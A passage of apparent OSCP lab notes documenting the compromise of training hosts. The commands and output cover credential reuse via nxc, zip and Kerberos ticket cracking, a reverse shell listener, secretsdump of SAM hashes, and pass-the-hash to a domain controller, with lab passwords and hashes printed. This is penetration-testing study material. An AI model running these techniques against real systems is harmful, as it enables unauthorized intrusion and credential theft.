+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;
```
```
┌──(.venv)─(kali㉿kali)-[~/…/Pen200/OSCP_A/192.168.x.144/git]
└─$ nxc ssh 192.168.178.144 -u stuart -p BreakingBad92
SSH         192.168.178.144 22     192.168.178.144  [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
SSH         192.168.178.144 22     192.168.178.144  [+] stuart:BreakingBad92  Linux - Shell access!
                                                                                                                                                                                                                                                                                                                                                                        
┌──(.venv)─(kali㉿kali)-[~/…/Pen200/OSCP_A/192.168.x.144/git]
└─$ nxc ftp 192.168.178.144 -u stuart -p BreakingBad92
FTP         192.168.178.144 21     192.168.178.144  [+] stuart:BreakingBad92
```

* Privilege Escalation
1. zip
```
stuart@oscp:~$ cd /opt/backup/
stuart@oscp:/opt/backup$ ll
total 92
drwxr-xr-x 2 root   root    4096 Nov 18  2022 ./
drwxr-xr-x 3 root   root    4096 Nov 18  2022 ../
-rw-r--r-- 1 stuart stuart 26890 Apr  5  2018 sitebackup1.zip
-rw-r--r-- 1 stuart stuart 24701 Nov 18  2022 sitebackup2.zip
-rw-r--r-- 1 stuart stuart 25312 Mar  5  2020 sitebackup3.zip
```
![image](https://hackmd.io/_uploads/By5UtEzDWx.png)
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.144]
└─$ zip2john sitebackup3.zip > passwd.hash 
ver 2.0 sitebackup3.zip/joomla/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/administrator/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/api/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/cache/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/cli/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/components/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/images/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/includes/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/language/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/language/overrides/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/layouts/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/libs/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/media/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/modules/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/plugins/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/templates/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/tmp/ is not encrypted, or stored with non-handled compression type
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.144]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passwd.hash                
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/app.php)     
codeblue         (sitebackup3.zip/joomla/web.config.txt)     
codeblue         (sitebackup3.zip/joomla/cli/joomla.php)     
codeblue         (sitebackup3.zip/joomla/cli/index.html)     
codeblue         (sitebackup3.zip/joomla/htaccess.txt)     
codeblue         (sitebackup3.zip/joomla/LICENSE.txt)     
codeblue         (sitebackup3.zip/joomla/includes/index.html)     
codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)     
codeblue         (sitebackup3.zip/joomla/cache/index.html)     
codeblue         (sitebackup3.zip/joomla/includes/defines.php)     
codeblue         (sitebackup3.zip/joomla/README.txt)     
codeblue         (sitebackup3.zip/joomla/language/index.html)     
codeblue         (sitebackup3.zip/joomla/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/framework.php)     
codeblue         (sitebackup3.zip/joomla/index.php)     
codeblue         (sitebackup3.zip/joomla/configuration.php)     
codeblue         (sitebackup3.zip/joomla/robots.txt)     
codeblue         (sitebackup3.zip/joomla/tmp/index.html)     
19g 0:00:00:03 DONE (2026-02-05 10:39) 5.775g/s 14939p/s 283856c/s 283856C/s dyesebel..trudy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
`joomla/configuration.php`
```
<?php
class JConfig {
	public $offline = false;
	public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
	public $display_offline_message = 1;
	public $offline_image = '';
	public $sitename = 'Challenge Lab';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = 20;
	public $access = 1;
	public $debug = false;
	public $debug_lang = false;
	public $debug_lang_const = true;
	public $dbtype = 'mysql';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = 'Password@1';
	public $db = 'jooml';
	public $dbprefix = 'o83rl_';
	public $dbencryption = 0;
	public $dbsslverifyservercert = false;
	public $dbsslkey = '';
	public $dbsslcert = '';
	public $dbsslca = '';
	public $dbsslcipher = '';
	public $force_ssl = 0;
	public $live_site = '';
	public $secret = 'Ee24zIK4cDhJHL4H';
	public $gzip = false;
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
	public $offset = 'UTC';
	public $mailonline = true;
	public $mailer = 'mail';
	public $mailfrom = 'chloe@challenge.lab';
	public $fromname = 'Challenge Lab';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = false;
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = 25;
	public $caching = 0;
	public $cache_handler = 'file';
	public $cachetime = 15;
	public $cache_platformprefix = false;
	public $MetaDesc = '';
	public $MetaAuthor = true;
	public $MetaVersion = false;
	public $robots = '';
	public $sef = true;
	public $sef_rewrite = false;
	public $sef_suffix = false;
	public $unicodeslugs = false;
	public $feed_limit = 10;
	public $feed_email = 'none';
	public $log_path = '/var/www/html/joomla/administrator/logs';
	public $tmp_path = '/var/www/html/joomla/tmp';
	public $lifetime = 15;
	public $session_handler = 'database';
	public $shared_session = false;
	public $session_metadata = true;
}
```
```
stuart@oscp:~$ su chloe
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

chloe@oscp:/home/stuart$ sudo -l
[sudo] password for chloe: 
Matching Defaults entries for chloe on oscp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User chloe may run the following commands on oscp:
    (ALL : ALL) ALL
chloe@oscp:/home/stuart$ 
```

## 192.168.x.145
* unisql?
![image](https://hackmd.io/_uploads/H1L14SR8-x.png)
    1. Github
    ![image](https://hackmd.io/_uploads/HypamSA8Zg.png)

    2. ExploitDB
    ![image](https://hackmd.io/_uploads/SkNmEB0UZe.png)
    ![image](https://hackmd.io/_uploads/BJYywH0U-g.png)
    ```
    ┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.145]
	└─$ nc -lvnp 4444
	listening on [any] 4444 ...
	connect to [192.168.45.175] from (UNKNOWN) [192.168.121.145] 50853
	Microsoft Windows [Version 10.0.19041.1]
	(c) 2019 Microsoft Corporation. All rights reserved.
	
	C:\WINDOWS\system32>whoami
	whoami
	oscp\offsec
	
	C:\WINDOWS\system32>whoami /priv
	whoami /priv
	
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                          State   
	============================= ==================================== ========
	SeShutdownPrivilege           Shut down the system                 Disabled
	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
	SeUndockPrivilege             Remove computer from docking station Disabled
	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
	SeTimeZonePrivilege           Change the time zone                 Disabled
	
	C:\WINDOWS\system32>
    ```
    
* Privilege Escalation
 1. `Putty`
![image](https://hackmd.io/_uploads/HkTJ2Oyw-l.png)
    ```
    ┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.145]
    └─$ nxc rdp 192.168.125.145 -u zachary -p Th3R@tC@tch3r
    RDP         192.168.125.145 3389   OSCP             [*] Windows 10 or Windows Server 2016 Build 19041 (name:OSCP)   (domain:oscp) (nla:True)
    RDP         192.168.125.145 3389   OSCP             [+] oscp\zachary:Th3R@tC@tch3r (Pwn3d!)
    ```

## 內網SMB

```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A]
└─$ nxc smb 10.10.90.0/24 -u Eric.Wallows -p EricLikesRunning800 --shares
SMB         10.10.90.142    445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         10.10.90.142    445    MS02             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         10.10.90.142    445    MS02             [*] Enumerated shares
SMB         10.10.90.142    445    MS02             Share           Permissions     Remark
SMB         10.10.90.142    445    MS02             -----           -----------     ------
SMB         10.10.90.142    445    MS02             ADMIN$                          Remote Admin
SMB         10.10.90.142    445    MS02             C$                              Default share
SMB         10.10.90.142    445    MS02             IPC$            READ            Remote IPC
SMB         10.10.90.141    445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         10.10.90.141    445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         10.10.90.141    445    MS01             [*] Enumerated shares
SMB         10.10.90.141    445    MS01             Share           Permissions     Remark
SMB         10.10.90.141    445    MS01             -----           -----------     ------
SMB         10.10.90.141    445    MS01             ADMIN$                          Remote Admin
SMB         10.10.90.141    445    MS01             C$                              Default share
SMB         10.10.90.141    445    MS01             IPC$            READ            Remote IPC
SMB         10.10.90.141    445    MS01             setup           READ            
SMB         10.10.90.140    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.90.140    445    DC01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         10.10.90.140    445    DC01             [*] Enumerated shares
SMB         10.10.90.140    445    DC01             Share           Permissions     Remark
SMB         10.10.90.140    445    DC01             -----           -----------     ------
SMB         10.10.90.140    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.90.140    445    DC01             C$                              Default share
SMB         10.10.90.140    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.90.140    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.90.140    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.90.140    445    DC01             Users           READ            
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A]
└─$ nxc smb 10.10.90.0/24 -u Eric.Wallows -p EricLikesRunning800 --users
SMB         10.10.90.142    445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         10.10.90.142    445    MS02             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         10.10.90.141    445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         10.10.90.141    445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         10.10.90.140    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.90.140    445    DC01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         10.10.90.140    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.90.140    445    DC01             Administrator                 2022-03-25 13:13:34 0       Built-in account for administering the computer/domain 
SMB         10.10.90.140    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.90.140    445    DC01             krbtgt                        2022-03-25 14:43:58 0       Key Distribution Center Service Account 
SMB         10.10.90.140    445    DC01             celia.almeda                  2022-04-01 16:25:03 0        
SMB         10.10.90.140    445    DC01             tom.kinney                    2022-04-01 17:28:07 0        
SMB         10.10.90.140    445    DC01             tom_admin                     2022-04-01 17:30:56 0        
SMB         10.10.90.140    445    DC01             Leonard.Morris                2022-04-05 11:22:38 0        
SMB         10.10.90.140    445    DC01             Sandra.Craig                  2022-04-05 11:22:38 0        
SMB         10.10.90.140    445    DC01             Chelsea.Byrne                 2022-04-05 11:22:38 0        
SMB         10.10.90.140    445    DC01             Luke.Martin                   2022-04-05 11:22:38 0        
SMB         10.10.90.140    445    DC01             Donna.Johnson                 2022-04-05 11:22:39 0        
SMB         10.10.90.140    445    DC01             Lawrence.Kay                  2022-04-05 11:22:48 0        
SMB         10.10.90.140    445    DC01             Emily.Bishop                  2022-04-05 11:22:49 0        
SMB         10.10.90.140    445    DC01             Linda.Patel                   2022-04-05 11:22:49 0        
SMB         10.10.90.140    445    DC01             Jamie.Thomas                  2022-04-05 11:22:49 0        
SMB         10.10.90.140    445    DC01             Shane.Mitchell                2022-04-05 11:22:49 0        
SMB         10.10.90.140    445    DC01             Frank.Farrell                 2022-04-05 11:22:56 0        
SMB         10.10.90.140    445    DC01             Jane.Booth                    2022-04-05 11:22:56 0        
SMB         10.10.90.140    445    DC01             Joan.North                    2022-04-05 11:22:57 0        
SMB         10.10.90.140    445    DC01             Carol.Webb                    2022-04-05 11:23:03 0        
SMB         10.10.90.140    445    DC01             Kenneth.Coles                 2022-04-05 11:23:04 0        
SMB         10.10.90.140    445    DC01             Oliver.Gray                   2022-04-05 11:23:04 0        
SMB         10.10.90.140    445    DC01             Georgina.Begum                2022-04-05 11:23:10 0        
SMB         10.10.90.140    445    DC01             Aimee.Hunt                    2022-04-05 11:23:10 0        
SMB         10.10.90.140    445    DC01             Thomas.Robinson               2022-04-05 11:23:10 0        
SMB         10.10.90.140    445    DC01             Janice.Turner                 2022-04-05 11:23:10 0        
SMB         10.10.90.140    445    DC01             sql_svc                       2022-12-05 13:49:44 0        
SMB         10.10.90.140    445    DC01             john.dorian                   2022-11-10 08:07:38 0        
SMB         10.10.90.140    445    DC01             web_svc                       2022-11-11 07:11:19 0        
SMB         10.10.90.140    445    DC01             eric.wallows                  2025-02-03 20:45:51 0        
SMB         10.10.90.140    445    DC01             [*] Enumerated 30 local users: OSCP
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

## Kerberoasting
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A]
└─$ sudo impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip 10.10.90.140 oscp.exam/Eric.Wallows
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------  --------  --------------------------  --------------------------  ----------
MSSQL/MS02.oscp.exam  sql_svc            2022-12-05 08:49:44.637096  2022-11-10 06:15:51.783016             
HTTP/MS01.oscp.exam   web_svc            2022-11-11 02:11:19.795439  2022-11-14 09:29:47.826775             



[-] CCache file is not found. Skipping...
```
```
$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$b12078d9bb3fc4fc27ce4dae175c9f35$4a41a77f5ebcf50abe634ebaa7c5ac19c5ca1ade577f71ca8158579e4b0ad632e888eeaea993dacaf7743c60487907491ea6d176481d75eb529040fdcd45b3139f6804e6408c9ad4c6546cd58bee44a16430c27c1e85e98d37c943e3b056b9c7907b4eba6527bfaf5a0598509c0b6272eb2ab9fd56370ff267558dde28253c8d7bded09c94f249c54fc3165d6ddc73a932470963310a8f68ea93baad6fef1e903ef8ac539733db48c884bd2008b7ca9a7ab949879aa7b7e2c511a37fe349b3a7321b25908571fed4e8564fd4244eac80b5f30e53397dd7bcbc8c184749cdb9a7eaa930b591ff4d05e2c248196c9d0ce46e008692e43c0bc9a607e5e19b57201259d288a0550a426d9d71a94ca4b84c053fc831dff5a7691609c678a31f38b55ea7fc2b987bdda6381e81748de7c41b3cb6de641cbf252ca300feaf204d6c937da93b4d78a39561b39d3a94e2458843b1f191d8262318bba52d342472422f37fbc8ca0c31f1ae9564c910888492616978fa465a8f35acf15703e2c9c620de2579d143ee2496c4420251ef745bb3d3da510724653e9d8b0a7a40397c866683f07bbb0a31c80c3a2ff42476d4525b3275db8bcad3a13acb5edda8bf828b90edc1dcc31b81004666a3dd969d57fd7f1a6570432a835bae31e36bdf51e09f63c9e7cb9959cef12a4f40ab8566af99b448a744dd7349103a9e1f3eefec619c3a7211c3233f44be4aa3ce9f4cec1cbc69ba525f0571e7e0396e7660ab6f517cd2337b3e50041160892f224f5a6c69c70ddb9ac32af609c091356496dfd496e790f55c55ceaba0d9f2109cb203921cf734e5b24993b012734a2b25715c4590df528ce0ae5496be36fea12c3bf8bc09bb137d920c34da5b75cb0f1235e3bbceb7f6a540dc35c1415a034ddc4a734f2d64d08fb05f99762c4b633b267130f5f26323c6f4e2b45a253ac69872d260f17b43fdebb223c9cf6b298997b777917d1b318962dd0581f05316a588c06992deadfce42837cbc8f8ac1ac21b7371346eefffda15699c1d901887ef117625b10c7d71bc0a43c4d47021c8f9659e62021fa2bf1888f1a65d89beca02d0a80cba981155a73ee937c5a8285df805281bfe974cdffeeaeb250b2c1cf15fa684004a658e719fc3093cf0fd59ec4ed46ef2ce6c1424259fefd9adf3ff1caa0084159a6bf7317d8f09e675212d5b61f1b09d8c480db53ec13b1f7148f00e2687b30d8c1805738fa8cccfe3da1cd4151e834f7ad63cb4c402baf03529c1387524bd3171e84cb76bc2ded83235bbdfa11fe887c5ea81b34371a0a023f0f573bcf1de0b70e7556a2e8d6363e5b04058dd8bf3175c5efeabe91ff681d960ddf47f2d0d9dcbd767fa9055721406f830537c46adf2192c77ae31196641af2cf5a9c0493d5c4973518e72935ebc734e8dc8fa7379ff8996f51239cd8c64d314758aa689f84d71c1d83ca967197603b4d54ed84c:Diamond1
```

## 10.10.x.142
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A]
└─$ evil-winrm -i 10.10.90.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd                                        
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
oscp\celia.almeda S-1-5-21-2610934713-1581164095-2706428072-1105


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

* Privilege Escalation
```
*Evil-WinRM* PS C:\windows.old\Windows\System32> Get-ChildItem -Path C:\ -Include SAM, SYSTEM -Force -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.FullName -match '^((?!C:\\Windows\\).)*$'}


    Directory: C:\Program Files\Common Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/25/2022   1:44 PM                System


    Directory: C:\Program Files (x86)\Common Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/25/2022   1:44 PM                System


    Directory: C:\ProgramData\USOShared\Logs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/5/2026   5:33 AM                System


    Directory: C:\Users\All Users\USOShared\Logs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/5/2026   5:33 AM                System


    Directory: C:\windows.old\Windows\System32


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/4/2022   6:00 AM          57344 SAM
-a----          4/4/2022   6:00 AM       11636736 SYSTEM
```
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/10.10.x.142]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up...
```
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/10.10.x.140]
└─$ nxc winrm 10.10.138.140 -u tom_admin -H userHash
WINRM       10.10.138.140   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.138.140   5985   DC01             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.138.140   5985   DC01             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.138.140   5985   DC01             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.138.140   5985   DC01             [-] oscp.exam\tom_admin:acbb9b77c62fdd8fe5976148a933177a
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.138.140   5985   DC01             [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
```